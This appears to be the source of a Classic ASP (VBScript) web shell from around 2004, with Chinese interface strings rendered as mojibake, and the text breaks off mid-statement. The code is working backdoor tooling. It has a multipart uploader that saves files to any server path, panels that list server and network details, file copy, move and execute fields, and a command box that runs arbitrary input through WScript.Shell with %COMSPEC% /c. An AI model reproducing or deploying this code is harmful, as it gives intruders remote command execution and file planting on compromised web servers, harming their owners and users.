<%@ LANGUAGE = VBScript codepage=936%><%Response.Expires=0
Co=Request.ServerVariables("URL")
zc="<b>����֮��&copy2004"
zz="<FONT style='FONT-SIZE:48pt;FONT-FAMILY:Webdings'>&ucirc;</FONT>"%><style>body{font-size:9pt;color:blue}table{font-family:����;font-size:9pt}a{font-family:����;font-size:9pt;color:blue;text-decoration:none}a:hover{font-family:����;color:red}input{BORDER-RIGHT:blue 1px solid;BORDER-TOP:blue 1px solid;BACKGROUND:white;BORDER-LEFT:blue 1px solid;BORDER-BOTTOM:blue 1px solid;FONT-FAMILY:Verdana,Arial FONT-COLOR:blue;FONT-SIZE:9pt;}</style><%if session("lZ")="lk"then
Session.TimeOut=50
Session(Co)=0
if request("p")=8 then%><SCRIPT RUNAT=SERVER LANGUAGE=VBScript>ScriptTimeOut=3000
dim zh
CLASS ZB
dim isForm,isFile
Public function Form(sg)
Form=isForm(lcase(sg))
if not isForm.exists(sg)then Form=""
end function
Public function File(sj)
File=isFile(lcase(sj))
if not isFile.exists(sj)then File=new ZI
end function
Private Sub CLASS_Initialize
dim Rq,sSt,vbCrlf,sx,oE,tZ,itt,FE,sFV,sFe,fj,iFE,iFS,iFd,sFN
set isForm=CreateObject("Scripting.Dictionary")
set isFile=CreateObject("Scripting.Dictionary")
set tZ=CreateObject("adodb.stream")
set zh=CreateObject("adodb.stream")
zh.Type=1
zh.Mode=3
zh.Open
zh.Write Request.BinaryRead(Request.TotalBytes)
zh.Position=0
Rq=zh.Read
iFS=1
iFd=LenB(Rq)
vbCrlf=chrB(13)&chrB(10)
sSt=MidB(Rq,1,InStrB(iFS,Rq,vbCrlf)-1)
itt=LenB(sSt)
iFS=iFS+itt+1
while (iFS+10)<iFd
oE=InStrB(iFS,Rq,vbCrlf&vbCrlf)+3
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=iFS
zh.CopyTo tZ,oE-iFS
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sx=tZ.ReadText
tZ.Close
iFS=InStrB(oE,Rq,sSt)
fj=InStr(22,sx,"name=""",1)+6
iFE=InStr(fj,sx,"""",1)
sFN=lcase(Mid(sx,fj,iFE-fj))
if InStr(45,sx,"filename=""",1)>0 then
set FE=new ZI
fj=InStr(iFE,sx,"filename=""",1)+10
iFE=InStr(fj,sx,"""",1)
sFe=Mid(sx,fj,iFE-fj)
FE.filename=GA(sFe)
FE.fh=GP(sFe)
fj=InStr(iFE,sx,"Content-Type:",1)+14
iFE=InStr(fj,sx,vbCr)
FE.Fz=Mid(sx,fj,iFE-fj)
FE.FSt=oE
FE.fy=iFS-oE-3
FE.fme=sFN
if not isFile.Exists(sFN)then isFile.add sFN,FE
else
tZ.Type=1
tZ.Mode=3
tZ.Open
zh.Position=oE
zh.CopyTo tZ,iFS-oE-3
tZ.Position=0
tZ.Type=2
tZ.Charset="gb2312"
sFV=tZ.ReadText
tZ.Close
if not isForm.Exists(sFN)then isForm.Add sFN,sFV
end if
iFS=iFS+itt+1
wend
Rq=""
set tZ=nothing
End Sub
Private function GP(Ph)
GP=left(Ph,InStrRev(Ph,"\"))
End function
Private function GA(Ph)
GA=mid(Ph,InStrRev(Ph,"\")+1)
End function End CLASS
CLASS ZI
dim FSt,fy,filename,fh,Fz,fme,dr
Public function SD(Ph)
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
zh.position=FSt
zh.copyto dr,fy
dr.SaveToFile Ph,2
dr.Close
set dr=nothing
end function End CLASS</SCRIPT><%set ud=new ZB
fP=ud.isform("fh")
if right(fP,1)<>"\"then fP=fP&"\"
for each fme in ud.isFile
set file=ud.isFile(fme)
if file.filename=""or file.fy<0 then
Response.Write"<a href=# onclick=history.go(-1)>�ļ�?</a>"
response.end
end if
file.SD fP&file.filename
Response.write"�ϴ��� "&fP&file.filename&"</br>"
set file=nothing
next
set ud=nothing
response.write"<a href=# onclick=history.back()>[����]</a>"
response.end
else
on error resume next
set fB=Server.CreateObject("Scripting.FileSystemObject")
Set tN=Server.CreateObject("WSCRIPT.NETWORK")
dN="\\"&tN.ComputerName&"\"&tN.UserName
If -2147221005=Err then
call MN()
else
Rx=Request("pw")
Rp=""&Co&"?pw="&Server.URlEncode(Request("jl"))&"&ib="&Request("ib")
select case request("id")
case"edit"call edit()
case"dir"call dir()
case"dc"call ZD()
case"pan"call pan()
case"FS"call MN()
case"out"call out()
case else call mz()
end select
end if
sub MN()
set sa=server.createobject("shell.application")%><p align=center><table border=1 width=580 cellspacing=0 cellpadding=0 bgcolor=#dddddd><tr><td>��������</td><td width=338><a href=http://<%=Request.ServerVariables("SERVER_NAME")%> target=_blank><%=Request.ServerVariables("SERVER_NAME")%></a></td></tr><tr><td>IP:�˿�  ʱ��</td><td><%=Request.ServerVariables("LOCAL_ADDR")%>:<%=Request.ServerVariables("SERVER_PORT")%>��<%=now%></td></tr><tr><td>CPU���� OS</td><td><%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> �� {<%=Request.ServerVariables("OS")%>}</td></tr><tr><td>������ַ:</td><td><%=dN%></td></tr><tr><%t1=timer
for i=1 to 500000
ys=1+1
next
t2=timer
T3=cstr(int(((t2-t1)*10000)+0.5)/10)%><td>�����ٶ�</td><td><%=T3%> ����(256M 2.4GΪ156.3����)</td></tr><tr><td><font color=red>�ͻ���IP���˿� [�޴���]</td><td><font color=red><%=Request.ServerVariables("REMOTE_ADDR")%>��<%=Request.ServerVariables("REMOTE_PORT")%>
[<%=Request.ServerVariables("HTTP_X_FORWARDED_FOR")%>]</td></tr><tr><td>���ļ�</td><td><%=server.mappath(Co)%></td></tr><TR><TD colspan=2><form method=post name=fm action="<%=Co%>?p=8" enctype="multipart/form-data"> ����·��:<input type=text name=fh value="<%=Server.MapPath(".")%>"size=84><BR></TD></tr><tr><td id=uz width=242>�ļ�1<input type=file name=file></td><td valign=top><SCRIPT language=javascript>function sm(){fl=document.fm;str='';if(!fl.ut.value)fl.ut.value=1;for(i=1;i<=fl.ut.value;i++)str+='�ļ�'+i+'<input type=file name=file'+i+'><br>';window.uz.innerHTML=str+'';}</SCRIPT><INPUT type=button onclick=sm() value=�趨> �ϴ� <INPUT value=1 name=ut size=2 maxlength=2> �ļ� <input type=submit value=�ϴ�> <INPUT type=reset value=����></td></TR></form></table><form method=post><input type=submit value=ִ��> <input type=submit name=ZG value=����������> <input type=submit name=ih value=�˳�> <INPUT type=reset value=����> <%=timer%>
<a href=<%=Co%>><%=zc%></a><BR>����:<input type=text name=zk> Ŀ��·��:<input type=text name=zl><br>�ƶ�:<input type=text name=zm> Ŀ��·��:<input type=text name=zn><br>����:<input type=text name=zo> ��Ӳ���:<input type=text name=zq><br>���:<input type=text name=ZJ> DOS ����:<input type=text name=ok value="%COMSPEC% /c "><br>����:<input type=text name=pw> 
ȥӣ�������վ <input type=submit name=bz value="����֮��"></form><hr><%if Request("ih")<>""then call out()
if Request("pw")<>""then call ZD()
if Request("bz")<>""then response.redirect""
if Request("ZG")<>""then
response.write"���������б���</p>"
for each Y in request.servervariables
response.write""&Y&"<br>"&request.servervariables(Y)&"<HR>"
next
end if
hz=Request("ok")
if hz<>""and hz<>"%COMSPEC% /c "then
server.CreateObject("WScript.Shell").run ""&hz&"",1,True
response.write"ִ����"&hz&""
end if
sz=Request("ZJ")
if sz<>""then
if right(sz,1)<>"\"then sz=sz&"\"
for each Z in sa.namespace(sz).items
respon